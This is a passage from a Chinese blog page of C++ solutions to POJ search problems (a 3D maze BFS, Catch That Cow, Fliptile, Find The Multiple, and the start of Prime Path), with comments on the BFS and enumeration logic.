<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;&#125;; <span class="hljs-comment">//六个方向</span><br><span class="hljs-type">int</span> l, r, c;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> f, x, y; <span class="hljs-comment">//位置</span><br>    <span class="hljs-type">int</span> step;    <span class="hljs-comment">//步数</span><br>    <span class="hljs-keyword">friend</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt;(node a, node b)<br>    &#123;                           <span class="hljs-comment">//步数小的先出来</span><br>        <span class="hljs-keyword">return</span> a.step &gt; b.step; <span class="hljs-comment">//优先队列，步数小的访问</span><br>    &#125;<br>&#125;;<br>priority_queue&lt;node&gt; q;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    node p;<br>    p.f = sl;<br>    p.x = sx;<br>    p.y = sy;<br>    p.step = <span class="hljs-number">0</span>;<br>    visited[sl][sx][sy] = <span class="hljs-number">1</span>;<br>    q.<span class="hljs-built_in">push</span>(p);<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        node s = q.<span class="hljs-built_in">top</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">if</span> (s.f == el &amp;&amp; s.x == ex &amp;&amp; s.y == ey)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Escaped in %d minute(s).\n&quot;</span>, s.step);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) <span class="hljs-comment">//6个方向遍历</span><br>        &#123;<br>            <span class="hljs-type">int</span> tl = s.f + base[i][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> tx = s.x + base[i][<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> ty = s.y + base[i][<span class="hljs-number">2</span>];<br>            <span class="hljs-keyword">if</span> (mp[tl][tx][ty] != <span class="hljs-string">&#x27;#&#x27;</span> &amp;&amp; tl &gt;= <span class="hljs-number">0</span> &amp;&amp; tl &lt; l &amp;&amp; tx &gt;= <span class="hljs-number">0</span> &amp;&amp; tx &lt; r &amp;&amp; ty &gt;= <span class="hljs-number">0</span> &amp;&amp; ty &lt; c &amp;&amp; !visited[tl][tx][ty]) <span class="hljs-comment">//判断是否能走的通</span><br>            &#123;<br>                node e;<br>                e.f = tl;<br>                e.x = tx;<br>                e.y = ty;<br>                e.step = s.step + <span class="hljs-number">1</span>;<br>                visited[e.f][e.x][e.y] = <span class="hljs-number">1</span>;<br>                q.<span class="hljs-built_in">push</span>(e);<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Trapped!&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (cin &gt;&gt; l &gt;&gt; r &gt;&gt; c, l + r + c)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; l; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; r; j++)<br>            &#123;<br>                cin &gt;&gt; mp[i][j];<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; c; k++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (mp[i][j][k] == <span class="hljs-string">&#x27;S&#x27;</span>)<br>                    &#123;<br>                        sl = i;<br>                        sx = j;<br>                        sy = k;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (mp[i][j][k] == <span class="hljs-string">&#x27;E&#x27;</span>)<br>                    &#123;<br>                        el = i;<br>                        ex = j;<br>                        ey = k;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">memset</span>(visited, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(visited));<br>        <span class="hljs-built_in">BFS</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Catch-That-Cow-Catch-That-Cow-POJ-3278-Virtual-Judge-vjudge-net"><a href="#Catch-That-Cow-Catch-That-Cow-POJ-3278-Virtual-Judge-vjudge-net" class="headerlink" title="Catch That Cow:Catch That Cow - POJ 3278 - Virtual Judge (vjudge.net)"></a>Catch That Cow:<a href="https://vjudge.net/problem/POJ-3278">Catch That Cow - POJ 3278 - Virtual Judge (vjudge.net)</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 100010</span><br><span class="hljs-type">int</span> step[N], visited[N];<br>queue&lt;<span class="hljs-type">int</span>&gt; q;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">BFS</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> now, next;<br>    step[n] = <span class="hljs-number">0</span>;<br>    visited[n] = <span class="hljs-number">1</span>;<br>    q.<span class="hljs-built_in">push</span>(n);<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        now = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>                next = now - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>                next = now + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">2</span>)<br>                next = now * <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> (next &lt; <span class="hljs-number">0</span> || next &gt; N)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (!visited[next])<br>            &#123;<br>                visited[next] = <span class="hljs-number">1</span>;<br>                q.<span class="hljs-built_in">push</span>(next);<br>                step[next] = step[now] + <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (next == k)<br>                <span class="hljs-keyword">return</span> step[next];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n, k;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);<br>    <span class="hljs-keyword">if</span> (n &gt;= k)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, n - k);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">BFS</span>(n, k));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h4 id="Fliptile：Fliptile-POJ-3279-Virtual-Judge-vjudge-net"><a href="#Fliptile：Fliptile-POJ-3279-Virtual-Judge-vjudge-net" class="headerlink" title="Fliptile：Fliptile - POJ 3279 - Virtual Judge (vjudge.net)"></a>Fliptile：<a href="https://vjudge.net/problem/POJ-3279">Fliptile - POJ 3279 - Virtual Judge (vjudge.net)</a></h4> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">17</span>;<br><span class="hljs-type">int</span> dir[<span class="hljs-number">5</span>][<span class="hljs-number">2</span>] = &#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;, &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;&#125;; <span class="hljs-comment">//每个点可以走的路线</span><br><span class="hljs-type">int</span> mp[maxn][maxn], turn[maxn][maxn], ans[maxn][maxn], cnt, res, M, N;<br><span class="hljs-comment">//mp数组存放磁盘，turn数组存放每个棋子反转的次数，ans存放最后输出的次数，cnt代表反转地板的总次数，res存放最小的反转次数</span><br><span class="hljs-comment">//0是白色，1是黑色</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getcolor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> temp = mp[x][y];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> xi = x + dir[i][<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> yi = y + dir[i][<span class="hljs-number">1</span>];<span class="hljs-comment">//某块地板的反转次数是由周围地板的颜色和其本身的颜色共同决定的</span><br>        <span class="hljs-keyword">if</span> (xi &gt;= <span class="hljs-number">0</span> &amp;&amp; xi &lt; M &amp;&amp; yi &gt;= <span class="hljs-number">0</span> &amp;&amp; yi &lt; N)<br>        &#123;<br>            temp += turn[xi][yi]; <span class="hljs-comment">//通过turn来推断地板的反转次数</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> temp % <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; M; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; N; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getcolor</span>(i - <span class="hljs-number">1</span>, j))<br>            &#123;<br>                turn[i][j] = <span class="hljs-number">1</span>;<br>                cnt++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cnt &gt; res)<br>            &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)<span class="hljs-comment">//检测最后一层是否都是白色 </span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getcolor</span>(M - <span class="hljs-number">1</span>, i))<br>        &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cnt &lt; res)<br>    &#123;<br>        <span class="hljs-built_in">memcpy</span>(ans, turn, <span class="hljs-built_in">sizeof</span>(turn));<br>        res = cnt;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (cin &gt;&gt; M &gt;&gt; N)<br>    &#123;<br>        res = INT_MAX;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; M; i++)<span class="hljs-comment">//输入棋盘的模样</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; N; j++)<br>            &#123;<br>                cin &gt;&gt; mp[i][j];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1</span> &lt;&lt; N; i++)<span class="hljs-comment">//二进制枚举第一行所有的反转情况</span><br>        &#123;<br>            cnt = <span class="hljs-number">0</span>;<br>            <span class="hljs-built_in">memset</span>(turn, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(turn));<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; N; j++)<br>            &#123;<br>                turn[<span class="hljs-number">0</span>][N - <span class="hljs-number">1</span> - j] = i &gt;&gt; j &amp; <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (turn[<span class="hljs-number">0</span>][N - <span class="hljs-number">1</span> - j])<br>                    cnt++;<br>            &#125;<br>            <span class="hljs-built_in">DFS</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (res == INT_MAX)<br>            cout &lt;&lt; <span class="hljs-string">&quot;IMPOSSIBLE&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; M; i++)<br>            &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; N; j++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (j &gt; <span class="hljs-number">0</span>)<br>                        cout &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>                    cout &lt;&lt; ans[i][j];<br>                &#125;<br>                cout &lt;&lt; endl;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Find-The-Multiple：Find-The-Multiple-POJ-1426-Virtual-Judge-vjudge-net"><a href="#Find-The-Multiple：Find-The-Multiple-POJ-1426-Virtual-Judge-vjudge-net" class="headerlink" title="Find The Multiple：Find The Multiple - POJ 1426 - Virtual Judge (vjudge.net)"></a>Find The Multiple：<a href="https://vjudge.net/problem/POJ-1426">Find The Multiple - POJ 1426 - Virtual Judge (vjudge.net)</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-keyword">while</span> (cin &gt;&gt; n, n) &#123;<br>        queue&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; q;<br>        q.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            ll temp = q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span> (temp % n == <span class="hljs-number">0</span>) &#123;<br>                cout &lt;&lt; temp &lt;&lt; endl;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            q.<span class="hljs-built_in">push</span>(temp * <span class="hljs-number">10</span>);<br>            q.<span class="hljs-built_in">push</span>(temp * <span class="hljs-number">10</span> + <span class="hljs-number">1</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Prime-Path：Prime-Path-POJ-3126-Virtual-Judge-vjudge-net"><a href="#Prime-Path：Prime-Path-POJ-3126-Virtual-Judge-vjudge-net" class="headerlink" title="Prime Path：Prime Path - POJ 3126 - Virtual Judge (vjudge.net)"></a>Prime Path：<a href="https://vjudge.net/problem/POJ-3126">Prime Path - POJ 3126 - Virtual Judge (vjudge.net)</a></h4><p><del>得用G++编译</del></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;deque&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e5</span> + <span class="hljs-number">10</span>;<br><span class="hljs-type">bool</span> isP[maxn], vis[maxn];<br><span class="hljs-type">int</span> prime[maxn];<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">readint</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);<br>    <span class="hljs-keyword">return</span> x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getP</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fill</span>(isP, isP + maxn, <span class="hljs-literal">true</span>);<br>    isP[<span class="hljs-number">1</span>] = isP[<span class="hljs-number">0</span>] = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; maxn; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (isP[i])<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">1000</span> &amp;&amp; i &lt; <span class="hljs-number">1e4</span>)<br>            &#123;<br>                prime[cnt++] = i;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + i; j &lt; maxn; j += i)<br>            &#123;<br>                isP[j] = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span 